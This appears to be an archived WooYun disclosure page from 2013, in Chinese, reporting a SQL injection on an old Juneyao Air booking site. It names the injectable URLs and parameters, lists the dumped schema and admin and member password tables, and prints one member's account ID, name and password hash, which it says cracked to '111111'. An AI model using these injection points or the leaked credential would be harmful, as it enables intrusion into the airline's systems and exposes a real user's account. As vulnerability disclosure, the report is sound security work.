<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		吉祥航空某站POST注入170万用户口令等敏感信息泄露  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		吉祥航空某站POST注入170万用户口令等敏感信息泄露  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/爱上襄阳">爱上襄阳</a> 
</li><li>提交时间：		2013-12-28 17:47</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-12-28：	细节已通知厂商并且等待厂商处理中<br/>
									2013-12-31：	厂商已经确认，细节仅向厂商公开<br/>
									2014-01-10：	细节向核心白帽子及相关领域专家公开<br/>
									2014-01-20：	细节向普通白帽子公开<br/>
									2014-01-30：	细节向实习白帽子公开<br/>
									2014-02-11：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">吉祥航空某站POST注入170万用户口令信息等敏感信息泄露</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">吉祥航空老站：http://2012b2c.juneyaoair.com/<br />
<br />
但是数据库仍然是老库，注册了一个账号，新站，老站通用。<br />
<br />
<br />
<br />
注入点：<br />
<br />
http://2012b2c.juneyaoair.com/crmInterLogin.do loginPwdId=123456&amp;loginNameId=123456 实体loginNameId需过滤<br />
<br />
<br />
<br />
http://2012b2c.juneyaoair.com/resetPwd.do loginType=1&amp;sendType=1&amp;id=88952634<br />
<br />
实体id需过滤<br />
<br />
<br />
<br />
跑数据库：<br />
<br />
</p><p class="detail"><a href="../images/28165319f056ccb411d2247d98968403f78a72db.png" target="_blank"><img src="../images/28165319f056ccb411d2247d98968403f78a72db.png" alt="2013-12-28 16-53-04.png" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
跑当前库的表：<br />
<br />
Database: HOFFP<br />
<br />
[181 tables]<br />
<br />
+--------------------------------+<br />
<br />
| AAA                            |<br />
<br />
| TBL_ADDRESS_CITY               |<br />
<br />
| TBL_AIRLINE                    |<br />
<br />
| TBL_AIRLINE_CODE_SHARE         |<br />
<br />
| TBL_AIRPORT                    |<br />
<br />
| TBL_BILLING_FILE_INFO          |<br />
<br />
| TBL_CARD_NUMBER_ASSIGN         |<br />
<br />
| TBL_CARD_NUMBER_CREATE_HIS     |<br />
<br />
| TBL_CHARACTER_SPELL_INDEX      |<br />
<br />
| TBL_CITY                       |<br />
<br />
| TBL_CKI_INFO                   |<br />
<br />
| TBL_CLASS                      |<br />
<br />
| TBL_CLASS_EXCHANGE_RULE        |<br />
<br />
| TBL_CLASS_MULTIPLIER_RULE      |<br />
<br />
| TBL_CLASS_TYPE                 |<br />
<br />
| TBL_COLLECT_PNR                |<br />
<br />
| TBL_COMPANY_ACCOUNT            |<br />
<br />
| TBL_COMPANY_ACCUMULATE_RULE    |<br />
<br />
| TBL_COMPANY_EXTRA_ACTIVITY     |<br />
<br />
| TBL_COMPANY_FLIGHT_ACTIVITY    |<br />
<br />
| TBL_COMPANY_INFO               |<br />
<br />
| TBL_COMPANY_MEMBER             |<br />
<br />
| TBL_COMPANY_MILES_DETAIL       |<br />
<br />
| TBL_COMPANY_MILES_EXPIRE       |<br />
<br />
| TBL_COMPANY_MILES_SPEND        |<br />
<br />
| TBL_COMPANY_PASSWORD_ALTER_HIS |<br />
<br />
| TBL_COMPANY_REDEEM_RULE        |<br />
<br />
| TBL_COMPANY_TYPE               |<br />
<br />
| TBL_COUNTRY                    |<br />
<br />
| TBL_CUSTOMER_ADDRESS           |<br />
<br />
| TBL_CUSTOMER_B2C               |<br />
<br />
| TBL_CUSTOMER_CERTIFICATE       |<br />
<br />
| TBL_CUSTOMER_CONTACT           |<br />
<br />
| TBL_CUSTOMER_INFO              |<br />
<br />
| TBL_CUSTOMER_INFO_TEMP         |<br />
<br />
| TBL_DATA_EXCHANGE_ERRCODE      |<br />
<br />
| TBL_DATA_EXCHANGE_HIS          |<br />
<br />
| TBL_EMAIL_JOB_ACCOUNT          |<br />
<br />
| TBL_EMAIL_JOB_LIST             |<br />
<br />
| TBL_ENROLLMENT_SOURCE          |<br />
<br />
| TBL_EXTRA_MILES_RULE           |<br />
<br />
| TBL_FLIGHT_ACTIVITY            |<br />
<br />
| TBL_FLIGHT_BALANCE_ACTIVITY    |<br />
<br />
| TBL_FLIGHT_CONTROL_RULE        |<br />
<br />
| TBL_FLIGHT_REDEEM              |<br />
<br />
| TBL_FLIGHT_REDEEM_DETAIL       |<br />
<br />
| TBL_FLIGHT_REDEEM_EXPENSE_RULE |<br />
<br />
| TBL_FLIGHT_REDEEM_REJECT       |<br />
<br />
| TBL_FLIGHT_REDEEM_RULE         |<br />
<br />
| TBL_FLIGHT_REDEEM_TEMP         |<br />
<br />
| TBL_FLIGHT_REJECT_ACTIVITY     |<br />
<br />
| TBL_FLIGHT_TEMP_ACTIVITY       |<br />
<br />
| TBL_FORCE_IMPORT_APPCODE       |<br />
<br />
| TBL_INFO_CUSTOM_TYPE           |<br />
<br />
| TBL_INFO_DISTRIBUTE            |<br />
<br />
| TBL_INITIAL_REDEEM_RULE        |<br />
<br />
| TBL_INVALID_TICKET_HISTORY     |<br />
<br />
| TBL_IRREGULAR_REASON           |<br />
<br />
| TBL_JOB_MESSAGE_CONFIG         |<br />
<br />
| TBL_JOB_SETTING                |<br />
<br />
| TBL_KEYCUSTOMER_AGREEMENT      |<br />
<br />
| TBL_KEYCUSTOMER_AGREEMENT_SUB  |<br />
<br />
| TBL_KEYCUSTOMER_COUPON_HIS     |<br />
<br />
| TBL_KEYCUSTOMER_EXPAND_ASSIGN  |<br />
<br />
| TBL_KEYCUSTOMER_INFO           |<br />
<br />
| TBL_KEYCUSTOMER_NOTICE         |<br />
<br />
| TBL_KEYCUSTOMER_REDEEM         |<br />
<br />
| TBL_KEYCUSTOMER_SETTLEMENT     |<br />
<br />
| TBL_KEYCUSTOMER_TICKET_HIS     |<br />
<br />
| TBL_KEYCUSTOMER_VISIT_HIS      |<br />
<br />
| TBL_KEYCUSTOMER_VISIT_TASK     |<br />
<br />
| TBL_LOCAL_ACCRUAL_RULE         |<br />
<br />
| TBL_LOCAL_ASSIGN_GROUP         |<br />
<br />
| TBL_MEMBER_ACTIVITY_DETAIL     |<br />
<br />
| TBL_MEMBER_ACTIVITY_SPEND      |<br />
<br />
| TBL_MEMBER_BENEFIC_CHANGE_HIS  |<br />
<br />
| TBL_MEMBER_BENEFIC_INFO        |  <br />
<br />
| TBL_MEMBER_BENEFIC_RULE        |<br />
<br />
| TBL_MEMBER_CARD                |<br />
<br />
| TBL_MEMBER_CARD_STATUS         |<br />
<br />
| TBL_MEMBER_CURRENT_ACCOUNT     |<br />
<br />
| TBL_MEMBER_EXTRA_ACTIVITY      |<br />
<br />
| TBL_MEMBER_FULFILLMENT_HISTORY |<br />
<br />
| TBL_MEMBER_FULFILMENT_FILE_HIS |<br />
<br />
| TBL_MEMBER_GROUP_CODE          |<br />
<br />
| TBL_MEMBER_GROUP_HISTORY       |<br />
<br />
| TBL_MEMBER_ID_MERGE_HIS        |<br />
<br />
| TBL_MEMBER_ID_USAGE            |<br />
<br />
| TBL_MEMBER_INFO                |<br />
<br />
| TBL_MEMBER_INFO_CHANGE_HISTORY |<br />
<br />
| TBL_MEMBER_LEVEL               |<br />
<br />
| TBL_MEMBER_LEVEL_CHANGE_HIS    |<br />
<br />
| TBL_MEMBER_LEVEL_UPGRADE_RULE  |<br />
<br />
| TBL_MEMBER_MILEAGE_ACCOUNT     |<br />
<br />
| TBL_MEMBER_MILEAGE_ADJUST      |<br />
<br />
| TBL_MEMBER_MILEAGE_EXPIRE      |<br />
<br />
| TBL_MEMBER_PASSWORD            |<br />
<br />
| TBL_MEMBER_PASSWORD_ALTER_HIS  |<br />
<br />
| TBL_MEMBER_PROMOTION_ACTIVITY  |<br />
<br />
| TBL_MEMBER_PROMOTION_TRACE     |<br />
<br />
| TBL_MEMBER_REFULFILLMENT_HIS   |<br />
<br />
| TBL_MEMBER_RELATION_ASSIGN     |<br />
<br />
| TBL_MEMBER_SERVICE_RECORD      |<br />
<br />
| TBL_MEMBER_STATUS              |<br />
<br />
| TBL_MEMBER_STATUS_CHANGE_HIS   |<br />
<br />
| TBL_MEMBER_SUPPLIER_INFO       |<br />
<br />
| TBL_MEMBER_VERIFYCODE          |<br />
<br />
| TBL_MEMBER_WEB_LOGON_HISTORY   |<br />
<br />
| TBL_MESSAGE_CONFIG             |<br />
<br />
| TBL_MILEAGE_PURCHASE           |<br />
<br />
| TBL_MILEAGE_PURCHASE_REJECT    |<br />
<br />
| TBL_MILEAGE_PURCHASE_RULE      |<br />
<br />
| TBL_MILEAGE_PURCHASE_TEMP      |<br />
<br />
| TBL_MILEAGE_VERIFY             |<br />
<br />
| TBL_MW_CLIENT_INFO             |<br />
<br />
| TBL_MW_LOG                     |<br />
<br />
| TBL_NETPAY_ORDER_HISTORY       |<br />
<br />
| TBL_NETPAY_ORDER_MANUAL_HIS    |<br />
<br />
| TBL_NOTE                       |<br />
<br />
| TBL_NOTE_TYPE                  |<br />
<br />
| TBL_NOTFLIGHT_REDEEM_RULE      |<br />
<br />
| TBL_NOT_FLIGHT_ACTIVITY        |<br />
<br />
| TBL_NOT_FLIGHT_REDEEM          |<br />
<br />
| TBL_NOT_FLIGHT_REDEEM_REJECT   |<br />
<br />
| TBL_NOT_FLIGHT_REDEEM_TEMP     |<br />
<br />
| TBL_PARAMETERS                 |<br />
<br />
| TBL_PARAMETERS_TYPE            |<br />
<br />
| TBL_PROGRAM_COUNTRY            |<br />
<br />
| TBL_PROMOTION_CHILD_RULE       |<br />
<br />
| TBL_PROMOTION_FLIGHT_RULE      |<br />
<br />
| TBL_PROMOTION_MASTER_RULE      |<br />
<br />
| TBL_PROMOTION_NOT_FLIGHT_RULE  |<br />
<br />
| TBL_PROMOTION_VIP_RULE         |<br />
<br />
| TBL_PROVINCE                   |<br />
<br />
| TBL_PURCHASE_TICKET            |<br />
<br />
| TBL_QUALIFICATION_REASON       |<br />
<br />
| TBL_REDEEM_CONTROL_RULE        |<br />
<br />
| TBL_REDEEM_QUANTITY_RULE       |<br />
<br />
| TBL_REDEEM_SPECIAL_RULE        |<br />
<br />
| TBL_ROLES                      |<br />
<br />
| TBL_ROLES_RIGHTS               |<br />
<br />
| TBL_SALUTATION                 |<br />
<br />
| TBL_SEGMENT_CONTROL_RULE       |<br />
<br />
| TBL_SEGMENT_MILEAGE            |<br />
<br />
| TBL_SENDING_SOURCE             |<br />
<br />
| TBL_SERVICE_CUSTOM_CONFIG      |<br />
<br />
| TBL_SMS_SEND_HISTORY           |<br />
<br />
| TBL_SMS_TYPE                   |<br />
<br />
| TBL_SPECIAL_CLASS_RULE         |<br />
<br />
| TBL_SPECIAL_PROMOTION_RULE     |<br />
<br />
| TBL_STATEMENT_CONTENT          |<br />
<br />
| TBL_STATEMENT_DETAIL           |<br />
<br />
| TBL_STATEMENT_INFO             |<br />
<br />
| TBL_STATEMENT_SEND_HISTORY     |<br />
<br />
| TBL_STATIC_MEMBER_GROUP        |<br />
<br />
| TBL_SUPPLIER                   |<br />
<br />
| TBL_SUPPLIER_ACCRUAL_RULE      |<br />
<br />
| TBL_SUPPLIER_ASSIGN_GROUP      |<br />
<br />
| TBL_SUPPLIER_BALANCE           |<br />
<br />
| TBL_SUPPLIER_BILLINGFILE_HIS   |<br />
<br />
| TBL_SUPPLIER_CLASS_RULE        |<br />
<br />
| TBL_SUPPLIER_DATAEXP_SEQNO     |<br />
<br />
| TBL_SUPPLIER_FLIGHT_ACTIVITY   |<br />
<br />
| TBL_SUPPLIER_FLIGHT_BALANCE    |<br />
<br />
| TBL_SUPPLIER_GROUP             |<br />
<br />
| TBL_SUPPLIER_PRODUCT           |<br />
<br />
| TBL_SUPPLIER_PRODUCT_TYPE      |<br />
<br />
| TBL_SUPPLIER_PROTOCOL_CONFIG   |<br />
<br />
| TBL_SUPPLIER_TEMPLATE_CONFIG   |<br />
<br />
| TBL_SUPPRETRO_REGISTER         |<br />
<br />
| TBL_SUPP_MIN_MILES_RULE        |<br />
<br />
| TBL_SYSTEM_FUNCTION_MANAGER    |<br />
<br />
| TBL_SYSTEM_LOG                 |<br />
<br />
| TBL_SYSTEM_PARAMETER           |<br />
<br />
| TBL_UNITED_CARD_COMPANY        |<br />
<br />
| TBL_USERS                      |<br />
<br />
| TBL_USER_ROLES                 |<br />
<br />
| TBL_VIRTUAL_TICKETNO_RULE      |<br />
<br />
| TEMP1                          |<br />
<br />
| TEMP2                          |<br />
<br />
| UPGRADE_CABIN_INFO             |<br />
<br />
+--------------------------------+<br />
<br />
<br />
<br />
跑users表，猜测应该是管理表：<br />
<br />
Table: TBL_USERS<br />
<br />
[10 columns]<br />
<br />
+-----------------+----------+<br />
<br />
| Column          | Type     |<br />
<br />
+-----------------+----------+<br />
<br />
| COMMENTS        | VARCHAR2 |<br />
<br />
| DEPARTMENT_CODE | VARCHAR2 |<br />
<br />
| OPERATE_DATE    | DATE     |<br />
<br />
| OPERATE_USER_ID | VARCHAR2 |<br />
<br />
| STATUS          | VARCHAR2 |<br />
<br />
| UPDATE_DATE     | DATE     |<br />
<br />
| UPDATE_USER_ID  | VARCHAR2 |<br />
<br />
| USER_ID         | VARCHAR2 |<br />
<br />
| USER_NAME       | VARCHAR2 |<br />
<br />
| USER_PASSWORD   | VARCHAR2 |<br />
<br />
+-----------------+----------+<br />
<br />
160多个后台用户：<br />
<br />
</p><p class="detail"><a href="../images/28165636242fe0ac1b894bbefb24605ab1065930.png" target="_blank"><img src="../images/28165636242fe0ac1b894bbefb24605ab1065930.png" alt="2013-12-28 16-55-21.png" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
跑member信息：<br />
<br />
Database: HOFFP<br />
<br />
Table: TBL_MEMBER_PASSWORD<br />
<br />
[12 columns]<br />
<br />
+-----------------+----------+<br />
<br />
| Column          | Type     |<br />
<br />
+-----------------+----------+<br />
<br />
| B2C_PASSWORD    | VARCHAR2 |<br />
<br />
| COMMENTS        | VARCHAR2 |<br />
<br />
| ID              | NUMBER   |<br />
<br />
| MEMBER_ID       | VARCHAR2 |<br />
<br />
| OPERATE_DATE    | DATE     |<br />
<br />
| OPERATE_USER_ID | VARCHAR2 |<br />
<br />
| PASSWORD        | VARCHAR2 |<br />
<br />
| PSW_STATUS      | VARCHAR2 |<br />
<br />
| RESET_ANSWER    | VARCHAR2 |<br />
<br />
| RESET_QUESTION  | VARCHAR2 |<br />
<br />
| UPDATE_DATE     | DATE     |<br />
<br />
| UPDATE_USER_ID  | VARCHAR2 |<br />
<br />
+-----------------+----------+<br />
<br />
用户登录账号口令信息：<br />
<br />
</p><p class="detail"><a href="../images/2816574588a40c4c535b29740df441ee3e8e2674.png" target="_blank"><img src="../images/2816574588a40c4c535b29740df441ee3e8e2674.png" alt="2013-12-28 16-26-41.png" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">登录一个账户试试：<br />
<br />
| 1801053115 | zhangting            6456C7FAC445F3C1C3E7F4405159D80<br />
<br />
<br />
<br />
二次解密后，密码为6个1 <br />
<br />
</p><p class="detail"><a href="../images/2817085717301aaa4be69da66d9276d838882eb7.png" target="_blank"><img src="../images/2817085717301aaa4be69da66d9276d838882eb7.png" alt="2013-12-28 17-06-07.png" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
<br />
<br />
 </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">过滤，修复 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/爱上襄阳" title="爱上襄阳">爱上襄阳</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-047254" title="吉祥航空某站POST注入170万用户口令等敏感信息泄露">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：11 </p>
													<p class="detail">确认时间：2013-12-31 10:11</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">CNVD确认所述情况，已经由CNVD通过公开联系渠道联系网站管理单位以及网站管理员处置。</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="47254";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
